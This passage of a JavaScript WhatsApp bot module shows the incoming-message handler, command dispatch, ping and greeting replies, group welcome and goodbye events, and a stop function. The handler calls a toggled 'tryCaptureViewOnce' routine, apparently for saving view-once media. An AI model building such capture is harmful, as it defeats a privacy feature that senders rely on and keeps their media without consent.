  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify') return;

    for (const msg of messages) {
      if (!msg.message) continue;
      const from = msg.key.remoteJid;
      if (!from) continue;

      const senderJid = msg.key.participant || from;
      const senderNum = (senderJid || '').split('@')[0].split(':')[0];
      const fromMeIsAdmin = msg.key.fromMe && ADMIN_NUMBER && senderNum === ADMIN_NUMBER;
      const fromBot = msg.key.fromMe && botJid && (msg.key.participant || '').startsWith(botJid.split(':')[0]);

      if (msg.key.fromMe && !fromMeIsAdmin) continue;
      if (fromBot && !fromMeIsAdmin) continue;

      try { await sock.readMessages([msg.key]); } catch (e) {}

      if (viewOnceEnabled) {
        await tryCaptureViewOnce(msg, from);
      }

      const text = extractText(msg);
      console.log(`[Msg] ${from}: ${text}`);

      if (text.startsWith('.')) {
        try {
          await handleCommand(msg, from, senderJid, text);
        } catch (e) {
          console.error('[Cmd] Error:', e.message);
        }
        continue;
      }

      if (isPaused(from)) continue;

      try {
        if (text.toLowerCase() === 'ping') {
          await withTyping(from, () => sock.sendMessage(from, { text: 'pong 🏓' }));
        } else if (text.toLowerCase() === 'hi' || text.toLowerCase() === 'hello') {
          await withTyping(from, () =>
            sock.sendMessage(from, { text: 'Hey! 👋 Type *.help* for commands.' })
          );
        }
      } catch (e) {}
    }
  });

  sock.ev.on('group-participants.update', async (event) => {
    try {
      const { id, participants, action } = event;
      if (action === 'add' && welcomeEnabled.has(id)) {
        await sendWelcome(id, participants);
      }
      if (action === 'remove' && goodbyeEnabled.has(id)) {
        await sendGoodbye(id, participants);
      }
    } catch (e) {
      console.error('[Group] Error:', e.message);
    }
  });
}

function stopBot() {
  isStopping = true;
  try {
    if (sock) {
      sock.end(undefined);
      sock = null;
    }
  } catch (e) {}
}

module.exports = { startBot, stopBot };